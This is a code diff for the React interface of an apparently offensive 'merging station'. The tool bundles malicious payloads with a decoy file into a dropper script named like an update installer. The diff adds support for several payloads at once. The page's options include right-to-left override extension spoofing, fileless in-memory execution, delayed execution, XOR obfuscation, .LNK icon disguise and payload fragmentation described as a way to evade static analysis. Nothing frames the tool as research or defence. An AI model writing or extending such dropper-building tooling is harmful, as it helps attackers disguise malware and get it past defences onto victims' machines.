@@ -2,7 +2,7 @@
 'use client';
 
 import { useState } from 'react';
-import { useForm } from 'react-hook-form';
+import { useForm, useFieldArray } from 'react-hook-form';
 import { zodResolver } from '@hookform/resolvers/zod';
 import { z } from 'zod';
 import { Card, CardHeader, CardTitle, CardDescription, CardContent, CardFooter } from '@/components/ui/card';
@@ -12,7 +12,7 @@ import { Label } from '@/components/ui/label';
 import { RadioGroup, RadioGroupItem } from '@/components/ui/radio-group';
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select';
 import { useToast } from '@/hooks/use-toast';
-import { Loader2, Binary, FileCode, Shield, Download, Clipboard, Image as ImageIcon, Key } from 'lucide-react';
+import { Loader2, Binary, FileCode, Shield, Download, Clipboard, Image as ImageIcon, Key, PlusCircle, Trash2 } from 'lucide-react';
 import { Progress } from '@/components/ui/progress';
 import { Form, FormControl, FormDescription, FormField, FormItem, FormLabel, FormMessage } from '@/components/ui/form';
 import { Badge } from '@/components/ui/badge';
@@ -21,7 +21,7 @@ import { Checkbox } from '@/components/ui/checkbox';
 import { Separator } from '@/components/ui/separator';
 
 const formSchema = z.object({
-  payloadFile: z.any().refine(files => files?.length === 1, "Payload file is required."),
+  payloadFiles: z.array(z.any()).refine(files => files?.length > 0 && files.every(f => f?.length === 1), "At least one payload file is required."),
   benignFile: z.any().refine(files => files?.length === 1, "Benign file is required."),
   iconFile: z.any().optional(),
   outputName: z.string().min(1, "Output name is required."),
@@ -55,6 +55,7 @@ export default function MergingStationPage() {
   const form = useForm<z.infer<typeof formSchema>>({
     resolver: zodResolver(formSchema),
     defaultValues: {
+      payloadFiles: [undefined],
       outputName: 'update_installer',
       outputFormat: 'ps1',
       extensionSpoofing: false,
@@ -64,6 +65,11 @@ export default function MergingStationPage() {
       executionDelay: '',
       fileless: true,
     },
+  });
+
+  const { fields, append, remove } = useFieldArray({
+    control: form.control,
+    name: "payloadFiles"
   });
 
   const watchObfuscationType = form.watch('obfuscationType');
@@ -102,18 +108,22 @@ export default function MergingStationPage() {
     };
 
     try {
-        log(`Build started for ${values.payloadFile[0].name} + ${values.benignFile[0].name}`);
+        log(`Build started for ${values.payloadFiles.length} payload(s) + ${values.benignFile[0].name}`);
 
-        const payloadFile = values.payloadFile[0] as File;
+        const payloadFiles = values.payloadFiles.map(fileList => fileList[0] as File);
         const benignFile = values.benignFile[0] as File;
 
-        const payloadContent = await fileToDataUrl(payloadFile);
+        const payloads = await Promise.all(payloadFiles.map(async (file) => ({
+            name: file.name,
+            content: await fileToDataUrl(file),
+        })));
+        
         const benignContent = await fileToDataUrl(benignFile);
         
         log('Files encoded. Sending to server for merging...');
         
         const response = await mergePayloads({
-            payload: { name: payloadFile.name, content: payloadContent },
+            payloads: payloads,
             benign: { name: benignFile.name, content: benignContent },
             outputFormat: values.outputFormat as any,
             obfuscationType: values.obfuscationType,
@@ -128,8 +138,8 @@ export default function MergingStationPage() {
         }
         
         log(`Dropper script generated successfully (${values.outputFormat}).`);
-        if (values.obfuscationType !== 'none') log(`Payload obfuscated with ${values.obfuscationType.toUpperCase()}`);
-        if (values.useFragmentation) log(`Payload split into fragments.`);
+        if (values.obfuscationType !== 'none') log(`Payloads obfuscated with ${values.obfuscationType.toUpperCase()}`);
+        if (values.useFragmentation) log(`Payloads split into fragments.`);
         if (values.fileless) log(`Fileless execution enabled.`);
         if (values.executionDelay) log(`Execution delayed by ${values.executionDelay} seconds.`);
 
@@ -187,7 +197,26 @@ export default function MergingStationPage() {
               <Card>
                 <CardHeader><CardTitle className="text-lg">1. Input Files</CardTitle></CardHeader>
                 <CardContent className="space-y-4">
-                  <FormField control={form.control} name="payloadFile" render={({ field: { onChange, onBlur, name, ref } }) => (<FormItem><FormLabel>Malicious Payload (.ps1, .bat, etc)</FormLabel><FormControl><Input type="file" onChange={e => onChange(e.target.files)} onBlur={onBlur} name={name} ref={ref} /></FormControl><FormMessage /></FormItem>)} />
+                  <div>
+                    <Label>Malicious Payloads</Label>
+                    <div className="space-y-2 mt-2">
+                       {fields.map((field, index) => (
+                           <FormField key={field.id} control={form.control} name={`payloadFiles.${index}`} render={({ field: { onChange, onBlur, name, ref } }) => (
+                               <FormItem>
+                                <div className="flex items-center gap-2">
+                                  <FormControl><Input type="file" onChange={e => onChange(e.target.files)} onBlur={onBlur} name={name} ref={ref} /></FormControl>
+                                  {fields.length > 1 && <Button type="button" variant="ghost" size="icon" onClick={() => remove(index)}><Trash2 className="h-4 w-4 text-destructive"/></Button>}
+                                </div>
+                                <FormMessage />
+                               </FormItem>
+                           )} />
+                       ))}
+                    </div>
+                    <Button type="button" variant="outline" size="sm" className="mt-2" onClick={() => append(undefined)}><PlusCircle className="mr-2 h-4 w-4"/>Add Another Payload</Button>
+                  </div>
+
+                  <Separator />
+
                   <FormField control={form.control} name="benignFile" render={({ field: { onChange, onBlur, name, ref } }) => (<FormItem><FormLabel>Benign File (Decoy)</FormLabel><FormControl><Input type="file" onChange={e => onChange(e.target.files)} onBlur={onBlur} name={name} ref={ref} /></FormControl><FormMessage /></FormItem>)} />
                   <FormField control={form.control} name="iconFile" render={({ field: { onChange, onBlur, name, ref } }) => (<FormItem><FormLabel>Icon File (.ico, optional)</FormLabel><FormControl><Input type="file" accept=".ico" onChange={e => onChange(e.target.files)} onBlur={onBlur} name={name} ref={ref} /></FormControl><FormDescription className="text-xs">Note: Icon injection is only possible for compiled executables. For scripts, this can be used with a .LNK shortcut wrapper.</FormDescription><FormMessage /></FormItem>)} />
                 </CardContent>
@@ -202,7 +231,7 @@ export default function MergingStationPage() {
                   <Label>Dropper Behavior</Label>
                    <FormField control={form.control} name="extensionSpoofing" render={({ field }) => ( <FormItem className="flex flex-row items-center space-x-3 space-y-0 rounded-md border p-4"><FormControl><Checkbox checked={field.value} onCheckedChange={field.onChange} /></FormControl><div className="space-y-1 leading-none"><FormLabel>Enable Extension Spoofing</FormLabel><FormDescription>Use RLO character to mask the true extension.</FormDescription></div></FormItem> )}/>
                    <FormField control={form.control} name="fileless" render={({ field }) => ( <FormItem className="flex flex-row items-center space-x-3 space-y-0 rounded-md border p-4"><FormControl><Checkbox checked={field.value} onCheckedChange={field.onChange} /></FormControl><div className="space-y-1 leading-none"><FormLabel>Fileless Execution</FormLabel><FormDescription>Run payload in memory instead of writing to disk.</FormDescription></div></FormItem> )}/>
-                   <FormField control={form.control} name="executionDelay" render={({ field }) => ( <FormItem><FormLabel>Execution Delay (seconds)</FormLabel><FormControl><Input type="number" placeholder="e.g., 10" {...field} value={field.value ?? ''} /></FormControl></FormItem> )}/>
+                   <FormField control={form.control} name="executionDelay" render={({ field }) => ( <FormItem><FormLabel>Execution Delay (seconds)</FormLabel><FormControl><Input type="number" placeholder="e.g., 10" {...field} /></FormControl></FormItem> )}/>
                 </CardContent>
               </Card>
               
@@ -224,7 +253,7 @@ export default function MergingStationPage() {
                             )}
                         />
                          {watchObfuscationType === 'xor' && (
-                            <FormField control={form.control} name="xorKey" render={({ field }) => ( <FormItem><FormLabel className="flex items-center gap-2"><Key className="h-4 w-4"/>XOR Key</FormLabel><FormControl><Input {...field} value={field.value ?? ''} placeholder="Enter encryption key" /></FormControl><FormMessage /></FormItem> )}/>
+                            <FormField control={form.control} name="xorKey" render={({ field }) => ( <FormItem><FormLabel className="flex items-center gap-2"><Key className="h-4 w-4"/>XOR Key</FormLabel><FormControl><Input {...field} placeholder="Enter encryption key" /></FormControl><FormMessage /></FormItem> )}/>
                          )}
                          <FormField control={form.control} name="useFragmentation" render={({ field }) => ( <FormItem className="flex flex-row items-center space-x-3 space-y-0 rounded-md border p-4"><FormControl><Checkbox checked={field.value} onCheckedChange={field.onChange} /></FormControl><div className="space-y-1 leading-none"><FormLabel>Enable Payload Fragmentation</FormLabel><FormDescription>Split the payload into smaller chunks to evade static analysis.</FormDescription></div></FormItem> )}/>
                     </CardContent>
